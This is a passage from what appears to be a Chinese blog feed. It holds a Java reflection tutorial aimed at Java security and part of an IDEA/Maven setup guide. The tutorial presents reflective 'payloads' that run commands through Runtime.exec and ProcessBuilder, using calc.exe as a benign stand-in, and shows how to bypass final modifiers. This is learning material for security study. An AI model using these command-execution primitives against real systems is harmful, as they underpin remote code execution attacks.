class="string">&quot;hello &quot;</span>+s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name=<span class="string">&quot;b1uel0n3&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=Person.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getDeclaredMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        m.invoke(<span class="keyword">new</span> <span class="title class_">Student</span>());  <span class="comment">//Student:hello</span></span><br><span class="line">    &#125;Student:hello</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">extends</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Student:hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person:hello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person类中定义了<code>hello()</code>方法，并且它的子类Student覆写了<code>hello()</code>方法，而尽管m是通过从<code>Person.class</code>获取的<code>Method</code>，由于<strong>实际调用时JVM会根据对象的实际类型进行动态绑定</strong>。所以作用于<code>Student</code>实例时，同样遵循多态原则，实际调用Student类的<code>hello()</code>方法。</p><h3 id="调用构造方法"><a href="#调用构造方法" class="headerlink" title="调用构造方法"></a>调用构造方法</h3><p>Java的<strong>反射API提供了Constructor对象，它包含一个构造方法的所有信息，可以创建一个实例。</strong></p><p>通过Class实例获取Constructor的方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getConstructor(Class...): 获取某个<span class="keyword">public</span>的Constructor</span><br><span class="line"><span class="title function_">getDeclaredConstructor</span><span class="params">(Class...)</span>: 获取某个Constructor</span><br><span class="line"><span class="title function_">getConstructors</span><span class="params">()</span>: 获取所有<span class="keyword">public</span>的Constructor</span><br><span class="line"><span class="title function_">getDeclaredConstructors</span><span class="params">()</span>: 获取所有Constructor</span><br></pre></td></tr></table></figure><p>调用非public的Constructor时，必须先通过<code>setAccessible(true)</code>设置允许访问。</p><h2 id="获取继承关系"><a href="#获取继承关系" class="headerlink" title="获取继承关系"></a>获取继承关系</h2><p>获取父类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.getSuperclass()</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class cls=Student.class.getSuperclass();</span><br><span class="line">System.out.println(cls.getName()); <span class="comment">//Person</span></span><br></pre></td></tr></table></figure><p>获取接口interface:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class.getInterface()</span><br></pre></td></tr></table></figure><h2 id="利用反射命令执行"><a href="#利用反射命令执行" class="headerlink" title="利用反射命令执行"></a>利用反射命令执行</h2><h3 id="Runtime"><a href="#Runtime" class="headerlink" title="Runtime"></a><code>Runtime</code></h3><p>在<code>java.long.Runtime</code>中可以通过exec方法执行本地命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br></pre></td></tr></table></figure><p>同样我们也能用反射实现：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        m.invoke(cls.newInstance(),<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Class.newInstance()</code>的作用是创建实例调用这个类的无参构造函数，但执行后发现报错<code>IllegalAccessException</code>，产生的原因可能有两点：</p><ul><li><strong>使用的类没有无参构造方法</strong></li><li><strong>使用的无参构造方法是私有的</strong></li></ul><p>而其中<code>Runtime</code>类的无参构造方法是私有的，且禁止外部直接通过new实例化：</p><p><img src="/2025/03/30/Java%E5%8F%8D%E5%B0%84/QQ20250330-175022.png"></p><p>同时发现<code>Runtime.exec</code>方法有六个重载，这里使用最简单的<code>exec(String command)</code>即可：</p><p><img src="/2025/03/30/Java%E5%8F%8D%E5%B0%84/QQ20250330-175328.png"></p><p>可以看到该重载方法只有一个参数且为String类型。</p><p>注意到<code>Runtime</code>类有一个<code>getRuntime</code>方法可以获取Runtime对象，且该方法是公有的：</p><p><img src="/2025/03/30/Java%E5%8F%8D%E5%B0%84/QQ20250330-175949.png"></p><p>所以我们可以通过使用<code>cls.getMethod(&quot;exec&quot;, String.class);</code>获取<code>Runtime.exec</code>方法，<code>Runtime.getRuntime()</code>用来获取<code>Runtime</code>对象，从而执行<code>Runtime.exec</code>方法</p><p>由于<code>Runtime.getRuntime()</code>是一个静态方法，所以在invoke调用时，第一个参数要传入一个<code>Runtime</code>类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        m.invoke(cls.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(cls), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先m获取<code>Runtime.exec</code>方法，要调用invoke，则第一个参数为实例对象，而<code>cls.getMethod(&quot;getRuntime&quot;)</code>获取<code>Runtime.getRuntime</code>方法，通过调用invoke返回<code>Runtime</code>对象作为<code>m.invoke</code>的第一个参数，由于getRuntime为静态方法，所以参数为一个类即cls</p><p>还可以<strong>利用设置<code>setAccessible(true)</code>修改构造方法访问权限实现暴力访问权限</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        Constructor c=cls.getDeclaredConstructor();</span><br><span class="line">        c.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        m.invoke(c.newInstance(), <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a><code>ProcessBuilder</code></h3><p>ProcessBuilder有两个构造函数：</p><p><img src="/2025/03/30/Java%E5%8F%8D%E5%B0%84/QQ20250330-183657.png"></p><p>利用第一种形式的构造函数，我们可以在<code>getConstructor</code>处传入<code>List.class</code>，获取<code>start</code>方法执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=ProcessBuilder.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        m.invoke(cls.getConstructor(List.class).newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理就是由于ProcessBuilder类中存在接受List参数的构造方法，由于Java泛型的类型擦除，反射时<code>List.class</code>对应<code>List&lt;String&gt;</code>、<code>List&lt;Integer&gt;</code>等所有泛型形式。所以通过<code>cls.getConstructor(List.class)</code>来获取第一种形式构造方法，然后再通过获取的构造方法创建实例，这里直接将我们的<strong>命令通过<code>Arrays.asList()</code>封装成List对象</strong>，然后调用<code>start()</code>方法启动进程执行命令</p><p>分解下我们的payload:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=ProcessBuilder.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        Constructor c=cls.getConstructor(List.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p</span> <span class="operator">=</span> c.newInstance(Arrays.asList(<span class="string">&quot;calc.exe&quot;</span>));</span><br><span class="line">        m.invoke(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然我们也可以利用第二种形式的构造函数，<strong>对于可变长参数，Java其实在编译时会编译成一个数组</strong>，也就是说，如下两种写法其实是等价的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String[] names)</span>&#123;&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hello</span><span class="params">(String...names)</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>对于反射来说，如果要获取的目标函数里包含可变长参数，我们可以直接认为是数组。</p><p>思路还是不变的，通过start进程启动命令即可，我们可将字符串数组的类<code>String[].class</code>传给<code>getConstructor</code>即可，同时注意在创建实例时注意构造函数接收的是可变长参数，而我们传给<code>ProcessBuilder</code>的是一个<code>List&lt;String&gt;</code>类型，二者叠加为一个一个二维数组，如果传一维数组会导致多个String参数报错：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">clazz.getConstructor(String[].class).newInstance(<span class="keyword">new</span></span><br><span class="line"><span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;)).start();</span><br></pre></td></tr></table></figure><blockquote><p>由于newInstance接收一个<code>Object</code>数组，数组每个元素对应构造函数的一个参数，所以newInstance要求参数是<code>object[]</code>，写入<code>new String[][]&#123;&#123;"cmd"&#125;&#125;</code>可等效于<code>new Object[]&#123;String[]&#123;&quot;cmd&quot;&#125;&#125;</code></p></blockquote><p>反射payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=ProcessBuilder.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        m.invoke(cls.getConstructor(String[].class).newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分解payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class cls=ProcessBuilder.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">        Constructor c=cls.getConstructor(String[].class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">p</span> <span class="operator">=</span> c.newInstance(<span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;);</span><br><span class="line">        m.invoke(p);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用反射修改final关键字修饰的成员变量"><a href="#利用反射修改final关键字修饰的成员变量" class="headerlink" title="利用反射修改final关键字修饰的成员变量"></a>利用反射修改final关键字修饰的成员变量</h2><ul><li><p><strong>反射获取Field类的字段修饰符modifiers</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field modifiers=field.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>设置modifiers修改权限</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modifiers.setAccessible(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></li><li><p><strong>修改成员变量的Field对象的modifiers值</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modifiers.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br></pre></td></tr></table></figure></li><li><p><strong>修改成员变量值</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">field.set(类实例对象, 修改后的值);</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/ElloeStudy/p/16065219.html">https://www.cnblogs.com/ElloeStudy/p/16065219.html</a></p><p><a href="https://www.javasec.org/javase/Reflection/Reflection.html">https://www.javasec.org/javase/Reflection/Reflection.html</a></p><p><a href="https://pdai.tech/md/java/basic/java-basic-x-reflection.html#%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E5%B0%8F%E7%BB%93">https://pdai.tech/md/java/basic/java-basic-x-reflection.html#%E5%8F%8D%E5%B0%84%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B%E5%B0%8F%E7%BB%93</a></p><p><a href="https://nivi4.notion.site/Java-8e0ad38312714da48ec396a6544dd3d2#cc9b11b89ca84dbb81065621377306a6">https://nivi4.notion.site/Java-8e0ad38312714da48ec396a6544dd3d2#cc9b11b89ca84dbb81065621377306a6</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA使用配置教程</title>
      <link href="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/"/>
      <url>/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="MAVEN配置"><a href="#MAVEN配置" class="headerlink" title="MAVEN配置"></a>MAVEN配置</h2><h3 id="什么是MAVEN"><a href="#什么是MAVEN" class="headerlink" title="什么是MAVEN"></a>什么是MAVEN</h3><p><strong>Apache Maven</strong> 是一个基于 <strong>POM（Project Object Model，项目对象模型）</strong> 的 <strong>项目管理与构建工具</strong>，主要用于 <strong>Java 项目</strong>，但也支持其他语言（如 C#、Ruby 等）。它的核心目标是简化项目的构建、依赖管理和标准化开发流程。</p><h3 id="MAVEN下载"><a href="#MAVEN下载" class="headerlink" title="MAVEN下载"></a>MAVEN下载</h3><p>访问maven官网：**<a href="https://maven.apache.org/">MAVEN官网</a>**</p><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-213749.png"></p><p>点击download，windows点图中的链接下载：</p><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-213914.png"></p><p>将下载的压缩包解压即可</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>打开解压后的文件，复制好<strong>apache-maven</strong>的路径：</p><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-214605.png"></p><p>打开环境变量设置：<strong>设置-&gt;查看高级系统设置-&gt;环境变量</strong></p><p>点新建：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">变量名称：MAVEN_HOME</span><br><span class="line">值：复制的apache-maven路径</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-214952.png"></p><p>找到path：<strong>编辑-&gt;新建</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%MAVEN_HOME%\bin</span><br></pre></td></tr></table></figure><p>确定即可，然后查看是否配置成功，win+R运行cmd，输入<strong>mvn -version</strong>，如图所示则配置成功：</p><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-215331.png"></p><h3 id="配置本地仓库"><a href="#配置本地仓库" class="headerlink" title="配置本地仓库"></a>配置本地仓库</h3><p>由于Maven默认的远程仓库在国外，导致下载jar包时速度非常慢，这里推荐使用国内的<strong>阿里云仓库</strong>，可以提高访问和下载速度。</p><p>首先在maven目录新建一个mvn_rep作为我们的本地仓库，并复制该目录路径<code>D:\apache-maven-3.9.9\apache-maven-3.9.9\mvn_rep</code></p><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-220147.png"></p><p>修改<code>conf/settings.xml</code>中的<code>&lt;localRepository&gt;</code>为一个指定目录：</p><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-220616.png"></p><blockquote><p>添加后ctrl+s保存即可</p></blockquote><p>然后我们<strong>配置阿里云服务器镜像</strong>，修改conf&#x2F;settings.xml中的标签，为其添加如下子标签，完成后ctrl+s保存退出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 阿里云仓库 --&gt;</span><br><span class="line">&lt;mirror&gt;</span><br><span class="line">&lt;id&gt;alimaven&lt;/id&gt;</span><br><span class="line">&lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">&lt;name&gt;aliyun maven&lt;/name&gt;</span><br><span class="line">&lt;url&gt;http://maven.aliyun.com/nexus/content/repositories/central/&lt;/url&gt;</span><br><span class="line">&lt;/mirror&gt;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-220921.png"></p><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-221256.png"></p><h3 id="配置jdk"><a href="#配置jdk" class="headerlink" title="配置jdk"></a>配置jdk</h3><p><strong>在之前这个</strong> <strong>settings.xml</strong> <strong>文件中找到</strong> <strong>profiles</strong> <strong>节点</strong>：</p><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/"><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-221655.png" alt="QQ20250307-221655"></p><p>添加如下配置：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- java版本 --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.8<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-221836.png"></p><p><strong>查看是否配置成功，win+R快捷键运行cmd，输入 mvn help:system测试：</strong></p><p><img src="/2025/03/27/IDEA%E4%BD%BF%E7%94%A8%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/QQ20250307-222022.png"></p><p>如果出现下载很多文件的页面，即配置成功</p><p>因为如果第一次执行mvn help:system命令，Maven相关工具会自动到Maven中央仓库下载缺失的或者Maven中央仓库更新的各种配置文件和类库（jar包）到maven本地仓库中。</p><p>下载完成后，mvn help:system 命令会打印出所有的<strong>Java系统属性和环境变量</strong></p><h2 id="IDEA使用"><a href="#IDEA使用" class="headerlink" title="IDEA使用"></a>IDEA使用</h2><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><h4 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h4><ul><li><p><strong>psvm+tab键&#x2F;main+yab键</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args)</span><br></pre></td></tr></table></figure><blockquote><p>打出psvm后按下tab即可</p></blockquote></li><li><p><strong>sout+tab键</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 